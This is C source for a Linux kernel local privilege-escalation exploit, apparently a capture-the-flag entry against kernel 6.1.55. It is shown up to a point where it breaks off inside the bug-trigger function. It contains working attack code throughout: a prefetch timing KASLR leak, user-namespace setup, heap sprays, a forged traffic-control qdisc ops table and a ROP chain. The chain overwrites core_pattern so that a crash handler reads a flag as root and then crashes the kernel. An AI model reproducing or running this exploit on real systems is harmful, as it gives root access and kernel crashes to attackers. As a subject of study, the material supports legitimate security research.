#define _GNU_SOURCE
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/net_tstamp.h>
#include <linux/socket.h>
#include <linux/udp.h>
#include <arpa/inet.h>
#include <linux/keyctl.h>
#include <sched.h>
#include <err.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stddef.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <netinet/ip.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <net/if.h>
#include <pthread.h>
#include <libmnl/libmnl.h>
#include <sys/auxv.h>
#include <sys/sendfile.h>
#include <libnftnl/table.h>
#include <libnftnl/flowtable.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/object.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <sys/socket.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/resource.h>
#include <linux/if.h>
#include <linux/keyctl.h>
#include <byteswap.h>
#include <linux/netfilter/ipset/ip_set.h>
#include <linux/netfilter/ipset/ip_set_bitmap.h>
#include <err.h>
#include <linux/if_ether.h>
#include <linux/tc_act/tc_gact.h>
#include <linux/pkt_cls.h>
#include <limits.h>
#include <errno.h>
#include <linux/prctl.h>
#include <sys/prctl.h>

// #define KASLR_INTEL

// Kernel base address
uint64_t g_kernel_base = 0xffffffff81000000;

// miti 6.1.55 offsets
// kernfs_pr_cont_buf
#define KERNFS_ADDR (0xffffffff84716940 - 0xffffffff81000000 + g_kernel_base)
#define CORE_PATTERN (0xffffffff83bbace0 - 0xffffffff81000000 + g_kernel_base)

// 0xffffffff81133e4c: mov rsp, rbp; pop rbp; ret;
#define PIVOT_RBP (0xffffffff81133e4c - 0xffffffff81000000 + g_kernel_base)
#define POP_RSP (0xffffffff8224859b - 0xffffffff81000000 + g_kernel_base)

#define QDISC_RESET (0xffffffff81e83860 - 0xffffffff81000000 + g_kernel_base)

#define POP_RDI (0xffffffff821f1a4d - 0xffffffff81000000 + g_kernel_base)
#define POP_RSI (0xffffffff8223c6f0 - 0xffffffff81000000 + g_kernel_base)
#define POP_RAX (0xffffffff8223f9a5 - 0xffffffff81000000 + g_kernel_base)
#define JMP_RAX (0xffffffff821f5fbe - 0xffffffff81000000 + g_kernel_base)
#define STRCPY (0xffffffff821bc6f0 - 0xffffffff81000000 + g_kernel_base)

/* common utils */
void fatal(const char *msg)
{
    printf("[Fatal!] ");
    puts(msg);
    fflush(stdout);
    fflush(stderr);
    exit(EXIT_FAILURE);
}

#define SYSOK(x) ({                     \
    typeof(x) __res = (x);              \
    if (__res != (typeof(x))0)          \
        err(1, "[fail] SYSOK(" #x ")"); \
    __res;                              \
})

void set_cpu(int c)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(c, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

void mypause()
{
    printf("[~] pausing... (press enter to continue)\n");
    char scratch[11];
    read(0, scratch, 10); // wait for input
}
/* common utils end */

/*KASLR leak*/
inline __attribute__((always_inline)) uint64_t rdtsc_begin()
{
    uint64_t a, d;
    asm volatile("mfence\n\t"
                 "RDTSCP\n\t"
                 "mov %%rdx, %0\n\t"
                 "mov %%rax, %1\n\t"
                 "xor %%rax, %%rax\n\t"
                 "lfence\n\t"
                 : "=r"(d), "=r"(a)
                 :
                 : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end()
{
    uint64_t a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r"(d), "=r"(a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

void prefetch(void *p)
{
    asm volatile(
        "prefetchnta (%0)\n"
        "prefetcht2 (%0)\n"
        : : "r"(p));
}

size_t flushandreload(void *addr) // row miss
{
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}

#include <cpuid.h>
int cpu_is_intel(void)
{
    unsigned int eax, ebx, ecx, edx;
    char vendor[13];

    if (!__get_cpuid(0, &eax, &ebx, &ecx, &edx))
        return -1;

    memcpy(vendor + 0, &ebx, 4);
    memcpy(vendor + 4, &edx, 4);
    memcpy(vendor + 8, &ecx, 4);
    vendor[12] = '\0';

    if (strcmp(vendor, "GenuineIntel") == 0)
        return 1;

    if (strcmp(vendor, "AuthenticAMD") == 0)
        return 0;

    fatal("Unknown CPU type");
    return -1;
}

#define ARRAY_LEN(x) ((int)(sizeof(x) / sizeof(x[0])))
size_t kaslr_leak()
{
    const int is_cpu_intel = cpu_is_intel();
    uint64_t base;
    if (is_cpu_intel)
    {
        puts("[~] Begin KASLR leak (intel)");
#define OFFSET 0
#define START_INTEL (0xffffffff81000000ull + OFFSET)
#define END_INTEL (0xffffffffD0000000ull + OFFSET)
#define STEP_INTEL 0x0000000001000000ull
        while (1)
        {
            uint64_t bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END_INTEL - START_INTEL) / STEP_INTEL] = {};
                uint64_t addrs[(END_INTEL - START_INTEL) / STEP_INTEL];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START_INTEL + STEP_INTEL * (uint64_t)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        uint64_t addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++)
                {
                    if (times[ti] < minv)
                    {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini == (size_t)-1)
                {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                base -= OFFSET;
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %zx with %d votes\n", base, c);
        }
    }
    else
    {
        puts("[~] Begin KASLR leak (AMD)");
#define START_AMD (0xffffffff81000000ull)
#define END_AMD (0xffffffffc0000000ull)
#define STEP_AMD 0x0000000000200000ull
#define NUM_TRIALS 7
// largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

        while (1)
        {
            uint64_t bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END_AMD - START_AMD) / STEP_AMD] = {};
                uint64_t addrs[(END_AMD - START_AMD) / STEP_AMD];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START_AMD + STEP_AMD * (uint64_t)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        uint64_t addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                uint64_t max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++)
                {
                    uint64_t sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++)
                    {
                        sum += times[ti + i];
                    }
                    if (sum > max)
                    {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %zx with %d votes\n", base, c);
        }
    }

got_base:

    return base;
}
/*KASLR leak end*/

// Unshare stuff
// Write to a file so we can set our user ids
int write_mapping(const char *path, const char *content)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
    {
        printf("Failed to open %s: %s\n", path, strerror(errno));
        return -1;
    }

    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content))
    {
        printf("Failed to write to %s: %s\n", path, strerror(errno));
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

void setup_userns(void)
{
    // Unshare into new user namespace
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS) == -1)
    {
        printf("unshare failed: %s\n", strerror(errno));
        exit(-1);
    }

    // First disable setgroups
    if (write_mapping("/proc/self/setgroups", "deny") == -1)
    {
        printf("Failed to disable setgroups\n");
        exit(-1);
    }

    // Then map our UID and GID
    if (write_mapping("/proc/self/uid_map", "0 1000 1") == -1 ||
        write_mapping("/proc/self/gid_map", "0 1000 1") == -1)
    {
        printf("Failed to write ID mappings\n");
        exit(-1);
    }
}

/*netlink utils*/
struct netlink_send_cb_struct
{
    void (*cb)(char *, size_t, void *);
    void *cb_out;
};

int __netlink_send(int fd, const void *nlh, size_t size, char *nlbuf, size_t nlbuf_sz, int has_done_msg, struct netlink_send_cb_struct *cb_info)
{
    char nlbuf_cb_scratch[1024];
    struct iovec iov = {
        .iov_base = (void *)nlh,
        .iov_len = size,
    };
    struct msghdr msg = {
        .msg_name = NULL,
        .msg_namelen = 0,
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0,
    };

    if (sendmsg(fd, &msg, 0) < 0)
    {
        perror("sendmsg()");
        return -1;
    }
    ssize_t ret = recvfrom(fd, nlbuf, nlbuf_sz, 0, NULL, NULL);
    if (ret == -1)
    {
        perror("recvfrom()");
        return -1;
    }

    if (has_done_msg)
    {
        ssize_t ret2 = recvfrom(fd, &nlbuf_cb_scratch, sizeof(nlbuf_cb_scratch), 0, NULL, NULL); // done msg  TODO: not all requests have this...
        if (ret2 == -1)
        {
            perror("recvfrom()");
            return -1;
        }
    }

    struct nlmsghdr *response_nlh = (struct nlmsghdr *)nlbuf;
    {
        struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(response_nlh);
        if (err->error)
        {
            fprintf(stderr, "Netlink Result: %s\n", strerror(-err->error));
            return -err->error;
        }
    }

    if (cb_info)
        cb_info->cb(nlbuf, ret, cb_info->cb_out);
    return 0;
}

int netlink_send(int fd, const struct nlmsghdr *nlh)
{
    char nlbuf[4096] = {0}; // Buffer to store the response
    return __netlink_send(fd, nlh, nlh->nlmsg_len, nlbuf, sizeof(nlbuf), 0, NULL);
}

int netlink_open(int proto)
{
    struct sockaddr_nl addr = {0};
    addr.nl_family = AF_NETLINK;

    int s = socket(AF_NETLINK, SOCK_RAW, proto);
    if (s < 0)
    {
        perror("socket()");
        return s;
    }
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        perror("bind()");
        return -1;
    }

    return s;
}
/*netlink utils end*/

/*interface helpers*/
// Helper function to prepare and send netlink message
int send_netlink_message(int sock, struct nlmsghdr *nlh)
{
    struct sockaddr_nl nladdr = {0};
    struct iovec iov;
    struct msghdr msg = {0};

    nladdr.nl_family = AF_NETLINK;

    iov.iov_base = nlh;
    iov.iov_len = nlh->nlmsg_len;

    msg.msg_name = &nladdr;
    msg.msg_namelen = sizeof(nladdr);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    return sendmsg(sock, &msg, 0);
}

int set_interface_flags(int sock, const char *ifname, int flags, int change)
{
    struct
    {
        struct nlmsghdr nlh;
        struct ifinfomsg ifm;
        char buf[64];
    } req;

    // Prepare the netlink request
    memset(&req, 0, sizeof(req));

    // Setup the netlink header
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_SETLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    req.nlh.nlmsg_seq = 1;

    // Setup the interface info message
    req.ifm.ifi_family = AF_UNSPEC;
    req.ifm.ifi_index = if_nametoindex(ifname);
    if (req.ifm.ifi_index == 0)
    {
        perror("if_nametoindex");
        close(sock);
        return -1;
    }

    // Set the interface flags
    req.ifm.ifi_change = change;
    req.ifm.ifi_flags = flags;

    // Send the netlink message
    if (send_netlink_message(sock, &req.nlh) < 0)
    {
        perror("send_netlink_message");
        close(sock);
        return -1;
    }

    // Read the ACK response
    char buf[4096];
    int len;
    struct nlmsghdr *resp_nlh;

    len = recv(sock, buf, sizeof(buf), 0);
    if (len < 0)
    {
        perror("recv");
        close(sock);
        return -1;
    }

    resp_nlh = (struct nlmsghdr *)buf;
    if (resp_nlh->nlmsg_type == NLMSG_ERROR)
    {
        struct nlmsgerr *err = NLMSG_DATA(resp_nlh);
        if (err->error != 0)
        {
            fprintf(stderr, "Netlink error: %s\n", strerror(-err->error));
            close(sock);
            return -1;
        }
    }
    return 0;
}

// Function to bring an interface up
int set_interface_up(int fd, const char *ifname)
{
    return set_interface_flags(fd, ifname, IFF_UP, IFF_UP);
}

// Function to bring an interface down
int set_interface_down(int fd, const char *ifname)
{
    return set_interface_flags(fd, ifname, 0, IFF_UP);
}

// Function to set interface MTU
int set_interface_mtu(int sock, const char *ifname, int mtu)
{
    struct
    {
        struct nlmsghdr nlh;
        struct ifinfomsg ifm;
        char buf[128];
    } req;
    struct rtattr *rta;

    // Create a netlink socket
    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sock < 0)
    {
        perror("socket");
        return -1;
    }

    // Prepare the netlink request
    memset(&req, 0, sizeof(req));

    // Setup the netlink header
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_SETLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    req.nlh.nlmsg_seq = 1;

    // Setup the interface info message
    req.ifm.ifi_family = AF_UNSPEC;
    req.ifm.ifi_index = if_nametoindex(ifname);
    if (req.ifm.ifi_index == 0)
    {
        perror("if_nametoindex");
        close(sock);
        return -1;
    }

    // Add the MTU attribute
    rta = (struct rtattr *)(((char *)&req) + NLMSG_ALIGN(req.nlh.nlmsg_len));
    rta->rta_type = IFLA_MTU;
    rta->rta_len = RTA_LENGTH(sizeof(int));
    memcpy(RTA_DATA(rta), &mtu, sizeof(int));
    req.nlh.nlmsg_len = NLMSG_ALIGN(req.nlh.nlmsg_len) + RTA_LENGTH(sizeof(int));

    // Send the netlink message
    if (send_netlink_message(sock, &req.nlh) < 0)
    {
        perror("send_netlink_message");
        close(sock);
        return -1;
    }

    // Read the ACK response
    char buf[4096];
    int len;
    struct nlmsghdr *resp_nlh;

    len = recv(sock, buf, sizeof(buf), 0);
    if (len < 0)
    {
        perror("recv");
        close(sock);
        return -1;
    }

    resp_nlh = (struct nlmsghdr *)buf;
    if (resp_nlh->nlmsg_type == NLMSG_ERROR)
    {
        struct nlmsgerr *err = NLMSG_DATA(resp_nlh);
        if (err->error != 0)
        {
            fprintf(stderr, "Netlink error: %s\n", strerror(-err->error));
            close(sock);
            return -1;
        }
    }

    return 0;
}
/*interface helpers end*/

/*requests*/
char *PWN_DST_IP = "127.0.0.1";
int _send_req(int priority, int no_block, const char *payload, const size_t payload_len)
{
    int sock;
    struct sockaddr_in server;

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("Failed to create socket");
        return 1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)) < 0)
    {
        perror("Failed to set socket priority");
        close(sock);
        return 1;
    }

    if (!no_block)
    {
        // Set socket to non-blocking mode
        int flags = fcntl(sock, F_GETFL, 0);
        if (flags < 0)
        {
            perror("Failed to get socket flags");
            close(sock);
            return 1;
        }
        if (fcntl(sock, F_SETFL, flags | O_NONBLOCK) < 0)
        {
            perror("Failed to set socket to non-blocking");
            close(sock);
            return 1;
        }
    }

    // Configure server address
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(8888);
    if (inet_pton(AF_INET, PWN_DST_IP, &server.sin_addr) <= 0)
    {
        perror("Invalid address");
        close(sock);
        return 1;
    }

    // Send empty datagram
    if (sendto(sock, payload, payload_len, 0, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        perror("Failed to send");
        close(sock);
        return 1;
    }

    close(sock);
    return 0;
}

int send_req(int priority)
{
    return _send_req(priority, 0, "", 0);
}

int send_req_with_payload(int priority, const char *payload, const size_t payload_len)
{
    return _send_req(priority, 0, payload, payload_len);
}
/*requests end*/

/*util functions for tc*/
int get_qdisc_handle(__u32 *h, const char *str)
{
    *h = 0;
    __u32 maj;
    char *p;

    maj = TC_H_UNSPEC;
    if (strcmp(str, "none") == 0)
        goto ok;
    maj = strtoul(str, &p, 16);
    if (p == str || maj >= (1 << 16))
        return -1;
    maj <<= 16;
    if (*p != ':' && *p != 0)
        return -1;
ok:
    *h = maj;
    return 0;
}

int get_tc_classid(__u32 *h, const char *str)
{
    __u32 maj, min;
    char *p;

    maj = TC_H_ROOT;
    if (strcmp(str, "root") == 0)
        goto ok;
    maj = TC_H_UNSPEC;
    if (strcmp(str, "none") == 0)
        goto ok;
    maj = strtoul(str, &p, 16);
    if (p == str)
    {
        maj = 0;
        if (*p != ':')
            return -1;
    }
    if (*p == ':')
    {
        if (maj >= (1 << 16))
            return -1;
        maj <<= 16;
        str = p + 1;
        min = strtoul(str, &p, 16);
        if (*p != 0)
            return -1;
        if (min >= (1 << 16))
            return -1;
        maj |= min;
    }
    else if (*p != 0)
        return -1;

ok:
    *h = maj;
    return 0;
}

static __u32 get_id(const char *s_class)
{
    __u32 result;
    SYSOK(get_tc_classid(&result, s_class));
    return result;
}
/*util functions for tc end*/

/*kernfs section*/
uint8_t kernfs_data[4096] = {0};

// Send controlled data to deducible address in kernel from kernel base
void fill_kernfs_buf(void)
{
    // Create a lockfile that we can actually use
    setenv("XTABLES_LOCKFILE", "/tmp/xtables.lock", 1);

    // Redirect stdout and stderr to /dev/null
    int devnull = open("/dev/null", O_WRONLY);
    if (devnull < 0)
    {
        exit(-1);
    }
    dup2(devnull, STDOUT_FILENO);
    dup2(devnull, STDERR_FILENO);
    close(devnull);

    // Execute iptables to fill buffer
    execl("./xtables-legacy-multi", "iptables", "-A", "OUTPUT", "-m", "cgroup", "--path",
          kernfs_data, (char *)NULL);
}

size_t validate_kernfs_val(size_t val)
{

    for (int i = 0; i < 8; i++)
    {
        if (((val >> (i * 8)) & 0xFF) == 0)
        {
            fatal("val has null!");
            return 1;
        }
    }
    return val;
}

// Send kernfs data to the kernel
void send_kernfs_data(void)
{
    int pid = fork();
    if (pid < 0)
    {
        perror("fork");
        exit(-1);
    }

    // Child
    if (pid == 0)
    {
        fill_kernfs_buf(); // Doesn't return
    }

    // Parent, wait for child to finish
    int status;
    waitpid(pid, &status, 0);
}
/*kernfs section end*/

/*keyring section*/
#define KEY_DESC_SIZE (0x200 - 0x18 + 1)
char key_desc[KEY_DESC_SIZE];

typedef int32_t key_serial_t;

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
{
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size)
{
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        fatal("calloc");

    for (uint32_t i = start; i < start + spray_size; i++)
    {
        key_desc[0] = '\x01' + i;
        id_buffer[i] = add_key("user", key_desc, key_desc, sizeof(key_desc), KEY_SPEC_PROCESS_KEYRING);
    }

    return id_buffer;
}
/*keyring section end*/

/*sendmsg section start*/
#define SENDMSG_SIZE 0x2010
char spray_buf[SENDMSG_SIZE];

void spray_sendmsg()
{
    char *buf = spray_buf;
    struct msghdr msg = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);

    msg.msg_control = buf;
    msg.msg_controllen = SENDMSG_SIZE;
    msg.msg_name = (caddr_t)&addr;
    msg.msg_namelen = sizeof(addr);

    sendmsg(sockfd, &msg, 0);
}
/*sendmsg section end*/

#include "qdisc.h"
#include "tc_filters.h"
#include "mq_dev.h" // for sending requests to multiqueue device

/*exp code start*/
const char desired_core_pattern[] = "|/proc/%P/fd/666 %P";
int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {0};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, desired_core_pattern, strlen(desired_core_pattern)) == 0;
}

void crash()
{
    int memfd = memfd_create("", 0);
    sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
    dup2(memfd, 666);
    close(memfd);

    while (check_core() == 0)
        usleep(100); // 0.1ms

    *(size_t *)0 = 0;
}

void core_pattern_handler(char **argv)
{
    int pid = strtoull(argv[1], 0, 10);
    int pfd = syscall(SYS_pidfd_open, pid, 0);
    int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
    int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
    int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
    dup2(stdinfd, 0);
    dup2(stdoutfd, 1);
    dup2(stderrfd, 2);
    /* Get flag. Can't poweroff because CPU 0 is in infinite loop, so crash out.*/
    system("cat /flag;sleep 1;echo c>/proc/sysrq-trigger");
    exit(0);
}

// offset of forged qdisc from base of kernfs
const size_t KERNFS_BUF_QDISC_OFFSET = 8;
void prepare_rop()
{
    const size_t KERNFS_BUF_QDISC_OPS_OFFSET = KERNFS_BUF_QDISC_OFFSET; // doesn't really matter, but will become initial pivot base

#define QDISC_OFFS_OPS (0x18)
#define QDISC_OPS_OFFS_PEEK (56)
#define QDISC_OPS_OFFS_RESET (72)
    // this is the final pivot point. we place it after the forged ops table pointers
    const size_t KERNFS_BUF_STACK_OFFSET = KERNFS_BUF_QDISC_OFFSET + QDISC_OPS_OFFS_RESET + 8;

    memset(kernfs_data, 'A', sizeof(kernfs_data)); // kernfs does not allow null bytes, so we first fill the buffer
    memcpy(kernfs_data, "/a/b/", 5);               // allows us to use slashes in the rest of the exploit (used in the core_pattern string)

    *(size_t *)&kernfs_data[KERNFS_BUF_QDISC_OFFSET + QDISC_OFFS_OPS] = validate_kernfs_val(KERNFS_ADDR + KERNFS_BUF_QDISC_OPS_OFFSET); // qdisc->ops
    *(size_t *)&kernfs_data[KERNFS_BUF_QDISC_OFFSET + QDISC_OPS_OFFS_PEEK] = validate_kernfs_val(QDISC_RESET);                          // qdisc->ops->peek
    *(size_t *)&kernfs_data[KERNFS_BUF_QDISC_OFFSET + QDISC_OPS_OFFS_RESET] = validate_kernfs_val(PIVOT_RBP);                           // qdisc->ops->reset

    // initial pivot point: short ROP chain to pivot to full payload since the bytes after this are already used for qdisc ops pointers
    *(size_t *)&kernfs_data[KERNFS_BUF_QDISC_OFFSET] = validate_kernfs_val(0xd00fd00fcafebabe); // garbage - popped into rbp by gadget
    *(size_t *)&kernfs_data[KERNFS_BUF_QDISC_OFFSET + 0x08] = validate_kernfs_val(POP_RSP);
    *(size_t *)&kernfs_data[KERNFS_BUF_QDISC_OFFSET + 0x10] = validate_kernfs_val(KERNFS_ADDR + KERNFS_BUF_STACK_OFFSET);

    // final pivot point
    size_t *rop = (size_t *)&kernfs_data[KERNFS_BUF_STACK_OFFSET];
    size_t x = 0;
    rop[x++] = validate_kernfs_val(POP_RDI);
    rop[x++] = validate_kernfs_val(CORE_PATTERN);

    // this offset is the offset of the core_pattern in the kernfs buffer.
    // we will append this at the end of the ROP chain
    const size_t KERNFS_BUF_CORE_PATTERN_OFFSET = 152;

    // Since our payload location does not contain null bytes, we can use it directly.
    rop[x++] = validate_kernfs_val(POP_RSI);
    rop[x++] = validate_kernfs_val(KERNFS_ADDR + KERNFS_BUF_CORE_PATTERN_OFFSET);

    rop[x++] = validate_kernfs_val(STRCPY);

    // infinite loop - won't trigger irq crash :D
    rop[x++] = validate_kernfs_val(POP_RAX);
    rop[x++] = validate_kernfs_val(JMP_RAX);
    rop[x++] = validate_kernfs_val(JMP_RAX);

    // append core_pattern
    if (((size_t)&rop[x]) - (size_t)kernfs_data != KERNFS_BUF_CORE_PATTERN_OFFSET)
        fatal("Incorrect KERNFS_BUF_CORE_PATTERN_OFFSET");

    strcpy((char *)&rop[x], desired_core_pattern);
    send_kernfs_data();
}

#define INITIAL_MTU 800
#define FINAL_MTU 65536
const char *drr_name = "3:0";
const char *drr_class1 = "3:1";
const char *drr_class2 = "3:2";
const char *plug_name = "4:0";
const char *fq_codel_name = "5:0";
const char mq_dev_packet_payload[INITIAL_MTU + 200]; // any size larger than INITIAL_MTU

// Helper function to add rtattr to netlink message
static void add_rtattr(struct nlmsghdr *nlh, int type, const void *data, int len)
{
    struct rtattr *rta;
    int rtalen = RTA_LENGTH(len);

    rta = (struct rtattr *)(((char *)nlh) + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = rtalen;
    if (data)
    {
        memcpy(RTA_DATA(rta), data, len);
    }
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + rtalen;
}

int create_multiqueue_device(int sock, const char *ifname, __u32 num_tx_queues, __u32 num_rx_queues)
{
    struct
    {
        struct nlmsghdr nlh;
        struct ifinfomsg ifm;
        char buf[256];
    } req;

    // Prepare the netlink request
    memset(&req, 0, sizeof(req));

    // Setup the netlink header
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_NEWLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK;
    req.nlh.nlmsg_seq = 1;

    // Setup the interface info message
    req.ifm.ifi_family = AF_UNSPEC;
    req.ifm.ifi_type = 0;
    req.ifm.ifi_index = 0;

    // Add interface name attribute
    add_rtattr(&req.nlh, IFLA_IFNAME, ifname, strlen(ifname) + 1);

    /* number of TX/RX queues (top-level attributes) */
    add_rtattr(&req.nlh, IFLA_NUM_TX_QUEUES,
               &num_tx_queues, sizeof(num_tx_queues));
    add_rtattr(&req.nlh, IFLA_NUM_RX_QUEUES,
               &num_rx_queues, sizeof(num_rx_queues));

    // Add linkinfo attribute for dummy type
    struct rtattr *linkinfo = (struct rtattr *)(((char *)&req) + NLMSG_ALIGN(req.nlh.nlmsg_len));
    linkinfo->rta_type = IFLA_LINKINFO;
    linkinfo->rta_len = RTA_LENGTH(0);
    req.nlh.nlmsg_len = NLMSG_ALIGN(req.nlh.nlmsg_len) + RTA_LENGTH(0);

    // Add kind attribute inside linkinfo
    const char *kind = "dummy";
    struct rtattr *kind_attr = (struct rtattr *)(((char *)linkinfo) + RTA_LENGTH(0));
    kind_attr->rta_type = IFLA_INFO_KIND;
    kind_attr->rta_len = RTA_LENGTH(strlen(kind) + 1);
    memcpy(RTA_DATA(kind_attr), kind, strlen(kind) + 1);

    // Update linkinfo length
    linkinfo->rta_len = RTA_LENGTH(RTA_LENGTH(strlen(kind) + 1));
    req.nlh.nlmsg_len = NLMSG_ALIGN(req.nlh.nlmsg_len) + RTA_LENGTH(strlen(kind) + 1);

    // Send the netlink message using the new function
    return netlink_send(sock, &req.nlh);
}

int setup_vuln_tree(const int netlink_fd, const char *multiq_band_name)
{
    SYSOK(create_qdisc(netlink_fd, get_id(drr_name), get_id(multiq_band_name))); // :1 is bands[0], :2 is bands[1]
    SYSOK(create_class(netlink_fd, get_id(drr_class1), get_id(drr_name)));
    SYSOK(create_class(netlink_fd, get_id(drr_class2), get_id(drr_name)));

    SYSOK(set_interface_mtu(netlink_fd, MQ_DEV, INITIAL_MTU));
    SYSOK(create_qdisc_fqcodel(netlink_fd, get_id(fq_codel_name), get_id(drr_class1)));
    SYSOK(set_interface_mtu(netlink_fd, MQ_DEV, FINAL_MTU)); // increase mtu after creating fqcodel
    SYSOK(create_qdisc_plug4096(netlink_fd, get_id(plug_name), get_id(drr_class2)));

    return 0;
}

void trigger_bug(const int netlink_fd)
{
    // recall that in setup_drr_multiq(), we created a filter to direct all packets into 1:1
    // the send_mq_dev_raw_with_payload specifies the source port accordingly, passing the filter

    // 1. PLUG drr
    SYSOK(send_mq_dev_raw_with_payload(get_id(drr_class2), mq_dev_packet_payload, sizeof(mq_dev_packet_payload))); // plug

    // 2. Accumulate packets in fq_codel
    // pkt 1: set first above https://elixir.bootlin.com/linux/v6.14-rc2/source/include/net/codel_impl.h#L135
    // pkt 2-3: dequeue/drop, dequeue, set dropping = true
    // pkt 4-6: dequeue/drop , pkt 7 (GSO): dequeue
    // total = 3 drops

